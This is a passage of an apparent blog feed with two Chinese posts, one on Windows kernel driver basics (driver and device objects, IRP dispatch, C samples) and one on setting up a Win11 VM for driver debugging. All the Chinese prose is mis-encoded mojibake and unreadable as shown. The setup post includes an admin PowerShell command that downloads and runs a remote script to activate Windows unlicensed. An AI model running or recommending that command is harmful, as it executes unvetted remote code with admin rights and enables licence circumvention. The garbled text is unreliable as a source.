        <content type="html"><![CDATA[<h2 id="é©±åŠ¨">é©±åŠ¨</h2><p>åœ¨Windowsä¸­ï¼Œé©±åŠ¨æ˜¯è¿è¡Œåœ¨å†…æ ¸(R0å±‚)çš„è½¯ä»¶ã€‚ç”±äºè¿è¡Œåœ¨å†…æ ¸å±‚ï¼Œæ‰€ä»¥å¯ä»¥åšæ“ä½œç³»ç»Ÿå¯ä»¥åšçš„ç»å¤§å¤šæ•°äº‹æƒ…ï¼Œæ¯”å¦‚å’Œç¡¬ä»¶è¿›è¡Œäº¤äº’ï¼Œå°±å¿…é¡»åœ¨å†…æ ¸ä¸­æ‰§è¡Œã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé©±åŠ¨éƒ½æ˜¯ç”¨æ¥å®ç°æŸè®¾å¤‡çš„IOæ“ä½œçš„ã€‚</p><h3 id="åˆ†ç±»">åˆ†ç±»</h3><p>é©±åŠ¨åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li>è®¾å¤‡å‡½æ•°é©±åŠ¨ç¨‹åº<ul><li>å®ç°ç¡¬ä»¶è®¾å¤‡çš„é€»è¾‘ï¼Œæ¯”å¦‚è®¾å¤‡çš„åˆå§‹åŒ–å’Œæ•°æ®ä¼ è¾“ç­‰</li><li>ä¸€èˆ¬ä¸ºç¡¬ä»¶åˆ¶é€ å•†å¼€å‘</li><li>ä¾‹ï¼šé”®ç›˜é©±åŠ¨ç¨‹åºï¼Œæ˜¾ç¤ºé©±åŠ¨ç¨‹åºï¼Œæ‰“å°æœºé©±åŠ¨ç¨‹åº</li></ul></li><li>è®¾å¤‡ç­›é€‰å™¨é©±åŠ¨ç¨‹åº<ul><li>è®¾å¤‡ç­›é€‰å™¨æ˜¯ç”¨æ¥ä¿®æ”¹æˆ–æ‰©å±•è®¾å¤‡å‡½æ•°é©±åŠ¨çš„è¡Œä¸ºçš„é©±åŠ¨ï¼Œåˆ†ä¸ºä¸Šå±‚è¿‡æ»¤å™¨å’Œä¸‹å±‚è¿‡æ»¤å™¨</li><li>å¯ä»¥æ‹¦æˆªæˆ–ä¿®æ”¹è®¾å¤‡çš„æ“ä½œï¼Œç±»ä¼¼ä¸é’©å­</li><li>ä¾‹ï¼šæ‹¦æˆªå’Œè®°å½•USBè®¾å¤‡é€šä¿¡çš„é©±åŠ¨ç¨‹åº</li></ul></li><li>è½¯ä»¶é©±åŠ¨ç¨‹åº<ul><li>ä¸ºé€»è¾‘è®¾å¤‡æœåŠ¡çš„é©±åŠ¨ç¨‹åºï¼Œå®ç°è™šæ‹Ÿè®¾å¤‡æˆ–ç³»ç»ŸåŠŸèƒ½</li><li>å®ç°è™šæ‹ŸåŠŸèƒ½å¹¶å¤„ç†é«˜å±‚é€»è¾‘è€Œéç¡¬ä»¶äº¤äº’ã€‚</li><li>ä¾‹ï¼šè™šæ‹Ÿç£ç›˜ï¼Œè™šæ‹Ÿç½‘å¡</li></ul></li><li>æ–‡ä»¶ç³»ç»Ÿç­›é€‰å™¨é©±åŠ¨ç¨‹åº<ul><li>ç”¨æ¥ç›‘æ§ï¼Œä¿®æ”¹æˆ–å¢å¼ºæ–‡ä»¶ç³»ç»Ÿçš„è¡Œä¸ºçš„é©±åŠ¨ï¼Œé™„åŠ åœ¨æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨å †æ ˆä¸­ï¼Œå¯ä»¥æ‹¦æˆªæ–‡ä»¶æ“ä½œçš„IOæ“ä½œ</li><li>æ£€æŸ¥ä¿®æ”¹æ–‡ä»¶æ“ä½œï¼Œæ‰“å¼€è¯»å–å†™å…¥ç­‰ï¼Œæ‰§è¡Œæƒé™æ§åˆ¶ï¼ŒåŠ å¯†ï¼Œæ•°æ®å‹ç¼©ç­‰</li><li>ä¾‹ï¼šé˜²æ­¢æœªæˆæƒè®¿é—®æ–‡ä»¶</li></ul></li><li>æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åº<ul><li>å®ç°æ–‡ä»¶æ“ä½œé€»è¾‘çš„é©±åŠ¨(NTFS,FAT32ç­‰)ï¼Œæ–‡ä»¶ç³»ç»Ÿå †æ ˆä¸­çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç›´æ¥ç®¡ç†ç£ç›˜ä¸Šçš„æ–‡ä»¶</li><li>å®ç°æ–‡ä»¶è¯»å†™ï¼Œè·¯å¾„è§£æï¼Œç›®å½•ç®¡ç†</li><li>ä¾‹ï¼šWindowsä¸­çš„ntfs.syså’Œfat32.sys</li></ul></li></ul><h3 id="é©±åŠ¨å¯¹è±¡å’Œè®¾å¤‡å¯¹è±¡">é©±åŠ¨å¯¹è±¡å’Œè®¾å¤‡å¯¹è±¡</h3><h4 id="é©±åŠ¨å¯¹è±¡">é©±åŠ¨å¯¹è±¡</h4><p>æ“ä½œç³»ç»Ÿæ ‡è¯†ä¸€ä¸ªé©±åŠ¨çš„æ•°æ®ç»“æ„</p><p>è¯¥å¯¹è±¡ç”±æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ(ä¸‹é¢æ˜¯WDM)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pdriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverUnload\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">PUNICODE_STRING pRegPath<span class="comment">//æ³¨å†Œè¡¨è·¯å¾„</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverEntry\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;<span class="comment">//æŒ‡å®šé©±åŠ¨å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹‹ä¸­pDriverObjectæ˜¯æ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªé©±åŠ¨åˆ›å»ºçš„é©±åŠ¨å¯¹è±¡ï¼Œéƒ¨åˆ†å†…å®¹éœ€è¦åœ¨DriverEntryä¸­ç”±ç”¨æˆ·æ·»åŠ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following links all of the devices created by a single driver</span></span><br><span class="line">    <span class="comment">// together on a list, and the Flags word provides an extensible flag</span></span><br><span class="line">    <span class="comment">// location for driver objects.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section describes where the driver is loaded.  The count</span></span><br><span class="line">    <span class="comment">// field is used to count the number of times the driver has had its</span></span><br><span class="line">    <span class="comment">// registered reinitialization routine invoked.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The driver name field is used by the error log thread</span></span><br><span class="line">    <span class="comment">// determine the name of the driver that an I/O request is/was bound.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section is for registry support.  This is a pointer</span></span><br><span class="line">    <span class="comment">// to the path to the hardware information in the registry</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section contains the optional pointer to an array of</span></span><br><span class="line">    <span class="comment">// alternate entry points to a driver for &quot;fast I/O&quot; support.  Fast I/O</span></span><br><span class="line">    <span class="comment">// is performed by invoking the driver routine directly with separate</span></span><br><span class="line">    <span class="comment">// parameters, rather than using the standard IRP call mechanism.  Note</span></span><br><span class="line">    <span class="comment">// that these functions may only be used for synchronous I/O, and when</span></span><br><span class="line">    <span class="comment">// the file is cached.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section describes the entry points to this particular</span></span><br><span class="line">    <span class="comment">// driver.  Note that the major function dispatch table must be the last</span></span><br><span class="line">    <span class="comment">// field in the object so that it remains extensible.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure><p>åœ¨cä¸­ï¼Œå®ƒçš„å®šä¹‰å’Œå¯è¡Œçš„æ“ä½œå¦‚ä¸Š</p><p>å¯ä»¥çœ‹å‡ºæ“ä½œç³»ç»Ÿç”¨ä¸€ä¸ªå•é“¾è¡¨è¿æ¥äº†æ‰€æœ‰çš„è®¾å¤‡å¯¹è±¡ã€‚ä¸”ä½¿ç”¨äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>æ¥ä¸ºæ“ä½œç³»ç»Ÿè°ƒç”¨é©±åŠ¨ä¸­çš„å‡½æ•°æä¾›äº†åŸºç¡€ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªé©±åŠ¨æ³¨å†Œå¥½äº†åï¼Œä¼šå’Œå…¶å®ƒåŒç±»é©±åŠ¨ç»„åˆæˆé©±åŠ¨æ ˆï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åœ°å¤„ç†ä¸åŒå±‚çº§çš„é—®é¢˜ï¼Œæ¯å½“å¼•å‘ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šä»é«˜åˆ°ä½è¯¢é—®è¦ä¸è¦å¤„ç†ï¼Œå¦‚æœä¸å¤„ç†å°±ä¼šç»§ç»­å‘ä¸‹ï¼Œå¦‚æœå¤„ç†ï¼Œé‚£ä¹ˆå°±æ­¤ç»ˆæ­¢ï¼Œä¸ä¼šç»§ç»­ä¼ é€’ã€‚</p><h4 id="è®¾å¤‡å¯¹è±¡">è®¾å¤‡å¯¹è±¡</h4><p>è®¾å¤‡å¯¹è±¡æ˜¯æ“ä½œå¯¹è±¡ç”¨æ¥æè¿°ä¸€ä¸ªè®¾å¤‡çš„æ ¸å¿ƒæ•°æ®ç»“æ„ã€‚å¯ä»¥æ ‡è¯†å¹¶ç®¡ç†ç¡¬ä»¶è®¾å¤‡æˆ–é€»è¾‘è®¾å¤‡ã€‚</p><p>éœ€è¦è‡ªåˆ›å»º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = IoCreateDevice(</span><br><span class="line">        DriverObject,            <span class="comment">// æ‰€å±é©±åŠ¨å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">sizeof</span>(DEVICE_EXTENSION), <span class="comment">// è®¾å¤‡æ‰©å±•çš„å¤§å°</span></span><br><span class="line">        &amp;DeviceName,             <span class="comment">// è®¾å¤‡åç§°</span></span><br><span class="line">        FILE_DEVICE_UNKNOWN,     <span class="comment">// è®¾å¤‡ç±»å‹</span></span><br><span class="line">        <span class="number">0</span>,                       <span class="comment">// ç‰¹æ€§æ ‡å¿—</span></span><br><span class="line">        FALSE,                   <span class="comment">// æ˜¯å¦ä¸ºç‹¬å è®¾å¤‡</span></span><br><span class="line">        &amp;DeviceObject            <span class="comment">// è¾“å‡ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status; <span class="comment">// åˆ›å»ºå¤±è´¥æ—¶è¿”å›é”™è¯¯çŠ¶æ€</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING pRegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    PDEVICE_OBJECT pDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(<span class="string">L&quot;\\Device\\FileFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    status = IoCreateDevice(</span><br><span class="line">        pDriverObject,          <span class="comment">// é©±åŠ¨å¯¹è±¡</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// æ²¡æœ‰è®¾å¤‡æ‰©å±•</span></span><br><span class="line">        &amp;deviceName,            <span class="comment">// è®¾å¤‡å</span></span><br><span class="line">        FILE_DEVICE_DISK_FILE_SYSTEM, <span class="comment">// æŒ‡å®šä¸ºæ–‡ä»¶ç³»ç»Ÿç±»å‹</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// æ— ç‰¹æ®Šç‰¹æ€§</span></span><br><span class="line">        FALSE,                  <span class="comment">// éç‹¬å </span></span><br><span class="line">        &amp;pDeviceObject          <span class="comment">// è¾“å‡ºè®¾å¤‡å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Failed to create device object\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å¸è½½å‡½æ•°å’Œå…¶ä»–åˆå§‹åŒ–é€»è¾‘</span></span><br><span class="line">    pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = FileCreateHandler; <span class="comment">// å¤„ç†æ–‡ä»¶åˆ›å»º</span></span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = FileReadHandler;     <span class="comment">// å¤„ç†æ–‡ä»¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Device object created successfully\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(_In_ PDRIVER_OBJECT pDriverObject)</span> &#123;</span><br><span class="line">    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(<span class="string">L&quot;\\Device\\FileFilter&quot;</span>);</span><br><span class="line">    IoDeleteDevice(pDriverObject-&gt;DeviceObject); <span class="comment">// åˆ é™¤è®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;Driver unloaded\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IRP_MJ_CREATE å’Œ IRP_MJ_READ æ˜¯ I/O è¯·æ±‚åŒ…ï¼ˆIRPï¼‰çš„ä¸»åŠŸèƒ½ç ï¼Œåˆ†åˆ«å¯¹åº”æ–‡ä»¶/è®¾å¤‡çš„åˆ›å»ºï¼ˆæˆ–æ‰“å¼€ï¼‰æ“ä½œå’Œè¯»å–æ“ä½œã€‚å½“ç”¨æˆ·å±‚è°ƒç”¨ç›¸å…³ I/O æ“ä½œï¼ˆå¦‚ CreateFile æˆ– ReadFileï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿçš„ I/O ç®¡ç†å™¨ä¼šç”Ÿæˆå¯¹åº”çš„ IRPï¼Œå¹¶å°†å…¶ä¼ é€’åˆ°ç›®æ ‡è®¾å¤‡çš„é©±åŠ¨æ ˆä¸­ã€‚é©±åŠ¨ç¨‹åºé€šè¿‡åœ¨é©±åŠ¨å¯¹è±¡ä¸­æ³¨å†Œçš„è°ƒåº¦ä¾‹ç¨‹ï¼ˆDispatch Routineï¼‰å¤„ç†è¿™äº› IRP è¯·æ±‚ã€‚è°ƒåº¦ä¾‹ç¨‹ä¼šæŠŠä¸»åŠŸèƒ½ç æ˜ å°„ä¸ºMajorFunctionçš„ç´¢å¼•ï¼Œç„¶åé©±åŠ¨æŒ‡å®šå¯¹åº”ç´¢å¼•çš„å‡½æ•°æ¥å®ç°åŠŸèƒ½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> é©±åŠ¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é©±åŠ¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win11è™šæ‹Ÿæœºé…ç½®</title>
      <link href="/posts/a848d09.html"/>
      <url>/posts/a848d09.html</url>
      
        <content type="html"><![CDATA[<h2 id="iosä¸‹è½½">iosä¸‹è½½</h2><p><a href="https://next.itellyou.cn/Original/Index">Itellyou</a></p><h2 id="è™šæ‹Ÿæœº">è™šæ‹Ÿæœº</h2><p><a href="https://www.vmware.com/products">VMware</a></p><h2 id="å®‰è£…vmware-tools">å®‰è£…vmware tools</h2><p>è™šæ‹Ÿæœºæ•´ä¸ªå®‰è£…å¥½ä¹‹å(è¿›å…¥æ¡Œé¢)</p><p><img src="https://s2.loli.net/2025/03/05/q1o7PB8HZGiuNV6.png" alt="image-20250305212801916"></p><p>æ²¡æœ‰å®‰è£…çš„è¯ä¸ä¼šæ˜¯é‡æ–°å®‰è£…ï¼Œç‚¹å‡»åï¼ŒæŒ‰è™šæ‹Ÿæœºä¸­çš„æç¤ºå®‰è£…å³å¯ã€‚</p><h2 id="æ¿€æ´»">æ¿€æ´»</h2><p>ç®¡ç†å‘˜powershell:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">irm</span> https://get.activated.win | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure><h2 id="è¿æ¥ä¸»æœºç½‘ç»œ">è¿æ¥ä¸»æœºç½‘ç»œ</h2><p>è™šæ‹Ÿæœºç½‘ç»œé€‰æ‹©netæ¨¡å¼ã€å…³é—­è™šæ‹Ÿæœºé˜²ç«å¢™</p><p>win+xç„¶åiæ‰§è¡Œipconfigï¼šEthernet0å°±æ˜¯è™šæ‹Ÿæœºæœ¬åœ°ip</p><p>ä¸»æœºç”¨åŒç†æ–¹æ³•å¯ä»¥å¾—åˆ°ipåœ°å€ï¼Œç›¸äº’pingæ¥æµ‹è¯•</p><p>æˆ–è€…ç›´æ¥<code>ping è®¡ç®—æœºå</code> ä¹Ÿå¯ä»¥</p><h2 id="é…ç½®è™šæ‹Ÿæœºwdkå’Œè¿æ¥">é…ç½®è™šæ‹Ÿæœºwdkå’Œè¿æ¥</h2><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/provision-a-target-computer-wdk-8-1">é¢„é…è®¡ç®—æœºä»¥ä¾¿è¿›è¡Œé©±åŠ¨ç¨‹åºéƒ¨ç½²å’Œæµ‹è¯• (WDK 10) - Windows drivers | Microsoft Learn</a></p><p>åœ¨è™šæ‹Ÿæœºä¸­å®‰è£…wdkï¼Œæ‰§è¡Œ<code>C:\Program Files (x86)\Windows Kits\10\Remote\x64\WDK Test Target Setup x64-x64_en-us.msi</code>è¿™ä¸ªæ–‡ä»¶</p><p>ç„¶åvsæ‰“å¼€é¡¹ç›®çš„æ‰©å±•-driver-Test-Configure Devicesâ€¦æ·»åŠ å¯¹åº”ä¸»æœºåæˆ–ip</p><p>ç„¶åè®¾ç½®ä¸ºç›®æ ‡è®¡ç®—æœº</p><p><img src="https://s2.loli.net/2025/03/06/xT5iMW9stkQ6uJd.png" alt="image-20250306153628068"></p><h3 id="è°ƒè¯•">è°ƒè¯•</h3><p>è™šæ‹Ÿæœºä¸­å¼€å¯æµ‹è¯•æ¨¡å¼</p><p>å¯¹äºä¸Šé¢æ˜¾ç¤ºçš„keyå’Œportï¼Œå®¿ä¸»æœºä¸­</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Windbg <span class="literal">-k</span> net:port=xxx,key=xxx</span><br></pre></td></tr></table></figure><p>åœ¨C:\Program Files (x86)\Windows Kits\10\Debuggers\x64ä¸‹æ‰§è¡Œ</p><h2 id="å…³äºéƒ¨ç½²é©±åŠ¨å’Œåœ¨vsä¸­è°ƒè¯•çš„æŠ¥é”™">å…³äºéƒ¨ç½²é©±åŠ¨å’Œåœ¨vsä¸­è°ƒè¯•çš„æŠ¥é”™</h2><h3 id="ç¼–è¯‘æœŸæŠ¥é”™ï¼šéœ€è¦ç¼“è§£åº“æˆ–è€…è¯­æ³•é”™è¯¯">ç¼–è¯‘æœŸæŠ¥é”™ï¼šéœ€è¦ç¼“è§£åº“æˆ–è€…è¯­æ³•é”™è¯¯</h3><p>ç¡®ä¿ç¼“è§£åº“ç‰ˆæœ¬å’Œå·¥å…·é“¾ç‰ˆæœ¬ä¸€è‡´ï¼Œå¦‚æœæ˜¯æœ€æ–°ï¼Œéœ€è¦åœ¨é¡¹ç›®å±æ€§ä¸­æ‰¾åˆ°MVCSç‰ˆæœ¬ï¼Œè°ƒæ•´ä¸ºæ‰€æœ‰å¯é€‰ç‰ˆæœ¬ä¸­æœ€æ–°çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é»˜è®¤</p><p>è¯­æ³•é”™è¯¯éœ€è¦æ£€æŸ¥ç¼–ç ï¼Œå°è¯•ä»¥UTF8å­˜å‚¨æˆ–è€…GBKï¼Œå¤šè¯•å‡ ä¸ªåº”è¯¥å°±å¥½äº†</p><h3 id="æŠ¥é”™ï¼šç¬¬ä¸‰æ–¹infä¸åŒ…å«æ•°å­—ç­¾åä¿¡æ¯">æŠ¥é”™ï¼šç¬¬ä¸‰æ–¹infä¸åŒ…å«æ•°å­—ç­¾åä¿¡æ¯</h3><p>éœ€è¦ç”Ÿæˆcrtè¯ä¹¦æ–‡ä»¶ï¼Œé¡¹ç›®ï¼Œå±æ€§ï¼ŒInf2Catï¼ŒRun Inf2Cat æ”¹ä¸ºæ˜¯<br>å±æ€§ï¼ŒDriver Signingä¸­Sign Modeæ”¹ä¸ºTest Sign<br>è™šæ‹Ÿæœºå¼€å¯æµ‹è¯•æ¨¡å¼</p><h3 id="Windbgæ— æ³•è°ƒè¯•ï¼Œæ‰“å¼€ä¸€ç›´æ˜¾ç¤ºWaiting-to-reconnectâ€¦">Windbgæ— æ³•è°ƒè¯•ï¼Œæ‰“å¼€ä¸€ç›´æ˜¾ç¤ºWaiting to reconnectâ€¦</h3><p>é¦–å…ˆç¡®ä¿è™šæ‹Ÿæœºè°ƒè¯•æ¨¡å¼ä¸€æ‰“å¼€ï¼Œå¦‚æœvsä¸­è®¾ç½®å¥½äº†portå’Œkeyï¼Œä¸”è™šæ‹Ÿæœºä¸­<br><code>bcdedit /dbgsettings</code>æŸ¥çœ‹è®¾ç½®æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œå°è¯•å…³é—­è™šæ‹Ÿæœºçš„è°ƒè¯•æ¨¡å¼å†æ‰“å¼€ï¼Œé‡å¤ä¸¤ä¸‰æ¬¡ï¼Œç„¶åå†å°è¯•ï¼ˆè¿™ä¸ªè¢«å‘äº†å¥½ä¹…ï¼Œæœ€åè¿˜æ˜¯å­¦é•¿å¸®æˆ‘é…å¥½çš„ï¼‰</p><h3 id="driverqueryæ— æ³•çœ‹åˆ°å¯¹åº”çš„é©±åŠ¨">driverqueryæ— 